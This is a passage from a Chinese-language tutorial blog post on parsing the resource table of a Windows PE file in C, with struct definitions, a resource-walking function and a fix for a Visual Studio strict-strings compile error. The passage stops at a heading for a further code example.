<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_RESOURCE_DIRECTORY_ENTRY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            DWORD NameOffset<span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">;</span><span class="token comment">// 资源名偏移</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            DWORD NameIsString<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 资源名为字符串</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token punctuation">&#125;</span> DUMMYSTRUCTNAME<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        DWORD   Name<span class="token punctuation">;</span><span class="token comment">// 资源 / 语言类型</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        WORD    Id<span class="token punctuation">;</span><span class="token comment">// 资源数字 ID</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span> DUMMYUNIONNAME<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        DWORD   OffsetToData<span class="token punctuation">;</span><span class="token comment">// 数据偏移地址</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            DWORD   OffsetToDirectory<span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">;</span><span class="token comment">// 子目录偏移地址</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            DWORD   DataIsDirectory<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 数据为目录</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token punctuation">&#125;</span> DUMMYSTRUCTNAME2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token punctuation">&#125;</span> DUMMYUNIONNAME2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">;</span></pre></td></tr></table></figure><p><code>PIMAGE_RESOURCE_DIR_STRING_U</code></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_RESOURCE_DIR_STRING_U</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    WORD    Length<span class="token punctuation">;</span><span class="token comment">// 字符串长度</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    WCHAR   NameString<span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 字符串数组</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_RESOURCE_DIR_STRING_U<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_RESOURCE_DIR_STRING_U<span class="token punctuation">;</span></pre></td></tr></table></figure><p>资源数据： <code>PIMAGE_RESOURCE_DATA_ENTRY</code></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_RESOURCE_DATA_ENTRY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>	DWORD   OffsetToData<span class="token punctuation">;</span><span class="token comment">// 资源数据的 RVA</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	DWORD   Size<span class="token punctuation">;</span><span class="token comment">// 资源数据的长度</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	DWORD   CodePage<span class="token punctuation">;</span><span class="token comment">// 代码页</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	DWORD   Reserved<span class="token punctuation">;</span><span class="token comment">// 保留字段</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_RESOURCE_DATA_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_RESOURCE_DATA_ENTRY<span class="token punctuation">;</span></pre></td></tr></table></figure><h2 id="测试代码-3"><a class="anchor" href="#测试代码-3">#</a> 测试代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析资源表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ResourceTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">ResourceTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> g_ResType<span class="token punctuation">[</span><span class="token number">0x11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token comment">// 系统规定的资源信息</span></pre></td></tr><tr><td data-num="7"></td><td><pre>		<span class="token string">"NULL"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		<span class="token string">"鼠标指针"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>		<span class="token string">"位图"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		<span class="token string">"图标"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token string">"菜单"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>		<span class="token string">"对话框"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>		<span class="token string">"字符串列表"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token string">"字体目录"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>		<span class="token string">"字体"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre>		<span class="token string">"快捷键"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token string">"非格式化资源"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token string">"消息列表"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token string">"鼠标指针组"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token string">"NULL"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token string">"图标组"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token string">"NULL"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token string">"版本信息"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token comment">// 扩展 PE 头</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	PIMAGE_OPTIONAL_HEADER pOPtionHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_OPTIONAL_HEADER<span class="token punctuation">)</span><span class="token operator">&amp;</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token comment">// 定位资源表的位置</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	PIMAGE_DATA_DIRECTORY pResDir <span class="token operator">=</span> pOPtionHeader<span class="token operator">-></span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_RESOURCE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token comment">// 填充资源表的数据结构</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	PIMAGE_RESOURCE_DIRECTORY pFirst <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pResDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	<span class="token comment">// 资源总数 = 资源 ID 条目个数 + 资源名称条目个数</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	DWORD dwResNum <span class="token operator">=</span> pFirst<span class="token operator">-></span>NumberOfIdEntries <span class="token operator">+</span> pFirst<span class="token operator">-></span>NumberOfNamedEntries<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	<span class="token comment">// 资源具体信息结构填充</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	PIMAGE_RESOURCE_DIRECTORY_ENTRY pFirstEntry <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pFirst <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"根目录名称入口：%04X\n"</span><span class="token punctuation">,</span> pFirst<span class="token operator">-></span>NumberOfNamedEntries<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"根目录ID入口：%04X\n\n"</span><span class="token punctuation">,</span> pFirst<span class="token operator">-></span>NumberOfIdEntries<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>	<span class="token comment">// 根据资源总数判断需要循环多少次</span></pre></td></tr><tr><td data-num="42"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwResNum<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		<span class="token comment">// 判断 ID 是不是字符串，ID 不是字符串是系统资源</span></pre></td></tr><tr><td data-num="45"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>pFirstEntry<span class="token operator">-></span>NameIsString <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>			<span class="token keyword">if</span> <span class="token punctuation">(</span>pFirstEntry<span class="token operator">-></span>Id <span class="token operator">&lt;</span> <span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ResType：%s\n"</span><span class="token punctuation">,</span> g_ResType<span class="token punctuation">[</span>pFirstEntry<span class="token operator">-></span>Id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>			<span class="token keyword">else</span></pre></td></tr><tr><td data-num="52"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ResType：%d\n"</span><span class="token punctuation">,</span> g_ResType<span class="token punctuation">[</span>pFirstEntry<span class="token operator">-></span>Id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>		<span class="token comment">//ID 是字符串，所以代表这个资源是开发者的资源</span></pre></td></tr><tr><td data-num="57"></td><td><pre>		<span class="token keyword">else</span></pre></td></tr><tr><td data-num="58"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>			PIMAGE_RESOURCE_DIR_STRING_U pResName <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIR_STRING_U<span class="token punctuation">)</span><span class="token punctuation">(</span>pFirstEntry<span class="token operator">-></span>NameOffset <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pFirst<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>			<span class="token class-name">wchar_t</span> <span class="token operator">*</span> EpName <span class="token operator">=</span> new <span class="token class-name">wchar_t</span><span class="token punctuation">[</span>pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>			<span class="token function">memset</span><span class="token punctuation">(</span>EpName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>			<span class="token function">wcsncpy_s</span><span class="token punctuation">(</span>EpName<span class="token punctuation">,</span> pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> pResName<span class="token operator">-></span>NameString<span class="token punctuation">,</span> pResName<span class="token operator">-></span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>		<span class="token comment">// 判断一下，如果是 1，就代表这个资源是个目录</span></pre></td></tr><tr><td data-num="65"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>pFirstEntry<span class="token operator">-></span>DataIsDirectory <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>			<span class="token comment">// 资源表的数据结构</span></pre></td></tr><tr><td data-num="68"></td><td><pre>			PIMAGE_RESOURCE_DIRECTORY pSecond <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pFirstEntry<span class="token operator">-></span>OffsetToDirectory <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pFirst<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>			<span class="token comment">// 资源总数</span></pre></td></tr><tr><td data-num="70"></td><td><pre>			DWORD dwSecondCount <span class="token operator">=</span> pSecond<span class="token operator">-></span>NumberOfIdEntries <span class="token operator">+</span> pSecond<span class="token operator">-></span>NumberOfNamedEntries<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>			<span class="token comment">// 资源的具体信息的结构</span></pre></td></tr><tr><td data-num="72"></td><td><pre>			PIMAGE_RESOURCE_DIRECTORY_ENTRY pSecondEntry <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pSecond <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>			<span class="token comment">// 打印选中目录</span></pre></td></tr><tr><td data-num="74"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称入口：%04X\n"</span><span class="token punctuation">,</span> pSecond<span class="token operator">-></span>NumberOfNamedEntries<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ID入口：%04X\n\n"</span><span class="token punctuation">,</span> pSecond<span class="token operator">-></span>NumberOfIdEntries<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>			<span class="token comment">// 根据资源总数循环</span></pre></td></tr><tr><td data-num="77"></td><td><pre>			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwSecondCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>				<span class="token keyword">if</span> <span class="token punctuation">(</span>pSecondEntry<span class="token operator">-></span>NameIsString <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre>				<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>					<span class="token comment">// 没名字是 ID</span></pre></td></tr><tr><td data-num="82"></td><td><pre>					<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ID：%d\n"</span><span class="token punctuation">,</span> pSecondEntry<span class="token operator">-></span>Id<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>				<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>				<span class="token keyword">else</span></pre></td></tr><tr><td data-num="85"></td><td><pre>				<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>					<span class="token comment">// 有名字是字符串</span></pre></td></tr><tr><td data-num="87"></td><td><pre>					PIMAGE_RESOURCE_DIR_STRING_U pResName <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIR_STRING_U<span class="token punctuation">)</span><span class="token punctuation">(</span>pSecondEntry<span class="token operator">-></span>NameOffset <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pFirst<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>					<span class="token class-name">wchar_t</span> <span class="token operator">*</span> pName <span class="token operator">=</span> new <span class="token class-name">wchar_t</span><span class="token punctuation">[</span>pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>					<span class="token function">memset</span><span class="token punctuation">(</span>pName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>					<span class="token function">wcsncpy_s</span><span class="token punctuation">(</span>pName<span class="token punctuation">,</span> pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> pResName<span class="token operator">-></span>NameString<span class="token punctuation">,</span> pResName<span class="token operator">-></span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="91"></td><td><pre>					<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name：%s\n\n"</span><span class="token punctuation">,</span> pName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>					delete<span class="token punctuation">[</span><span class="token punctuation">]</span>pName<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>				<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="94"></td><td><pre>				<span class="token comment">// 判断是不是目录</span></pre></td></tr><tr><td data-num="95"></td><td><pre>				<span class="token keyword">if</span> <span class="token punctuation">(</span>pSecondEntry<span class="token operator">-></span>DataIsDirectory <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre>				<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="97"></td><td><pre>					<span class="token comment">// 填充数据结构</span></pre></td></tr><tr><td data-num="98"></td><td><pre>					PIMAGE_RESOURCE_DIRECTORY pThird <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pSecondEntry<span class="token operator">-></span>OffsetToDirectory <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pFirst<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="99"></td><td><pre>					<span class="token comment">// 填充具体信息结构</span></pre></td></tr><tr><td data-num="100"></td><td><pre>					PIMAGE_RESOURCE_DIRECTORY_ENTRY pThirdEntry <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pThird <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre>					pThirdEntry<span class="token operator">-></span>Name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="102"></td><td><pre>					<span class="token comment">// 如果不是目录</span></pre></td></tr><tr><td data-num="103"></td><td><pre>					<span class="token keyword">if</span> <span class="token punctuation">(</span>pThirdEntry<span class="token operator">-></span>DataIsDirectory <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="104"></td><td><pre>					<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="105"></td><td><pre>						<span class="token comment">// 资源表的具体信息结构</span></pre></td></tr><tr><td data-num="106"></td><td><pre>						PIMAGE_RESOURCE_DATA_ENTRY pSecData <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DATA_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pThirdEntry<span class="token operator">-></span>OffsetToData <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pFirst<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>						<span class="token keyword">char</span> <span class="token operator">*</span> pResbuf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pSecData<span class="token operator">-></span>OffsetToData<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="108"></td><td><pre>						DWORD StcDataOffset <span class="token operator">=</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pSecData<span class="token operator">-></span>OffsetToData<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="109"></td><td><pre>						<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RVA：%08X\n"</span><span class="token punctuation">,</span> pSecData<span class="token operator">-></span>OffsetToData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="110"></td><td><pre>						<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Offset：%08X\n"</span><span class="token punctuation">,</span> StcDataOffset<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>						<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size：%08X\n\n"</span><span class="token punctuation">,</span> pSecData<span class="token operator">-></span>Size<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="112"></td><td><pre>					<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="113"></td><td><pre>				<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="114"></td><td><pre>				pSecondEntry<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="115"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"=============================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="118"></td><td><pre>		pFirstEntry<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="119"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="120"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165714674.png" alt="image-20220301165714674" /></p>
<h2 id="报错"><a class="anchor" href="#报错">#</a> 报错</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165112177.png" alt="image-20220301165112177" /></p>
<p>出现这个问题的原因是：</p>
<p>从 VS2017 起，编译器要求通过使用字符串文本初始化的指针符合严格的  <code>const</code>  限定。所以会自动添加 <code>/Zc:strictStrings</code>  选项，你可能在上面没找到 <code>/Zc:strictStrings</code> ，其实它是通过 <code>/permissive-</code>  来隐式设置此选项。</p>
<h3 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h3>
<p>打开项目属性</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165546827.png" alt="image-20220301165546827" /></p>
<p>在配置属性中打开 C/C++，找到命令行后在它的 &quot;其它选项&quot; 中添加  <code>/Zc:strictStrings-</code>  即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165250094.png" alt="image-20220301165250094" /></p>
<p>显示正常：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165458999.png" alt="image-20220301165458999" /></p>
<h1 id="其他数据表的显示"><a class="anchor" href="#其他数据表的显示">#</a> 其他数据表的显示</h1>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165912221.png" alt="image-20220301165912221" /></p>
<p>在数据目录表中可以看到除了我们以上解析的数据目录表之外还存在其它数据目录，例如：调试、版权等这些不必要解析的数据目录表。</p>
<p>下面演示如何直接打印 RVA 和大小</p>
<h2 id="测试代码-4"><a class="anchor" href="#测试代码-4">#</a> 测试代码：</h2>
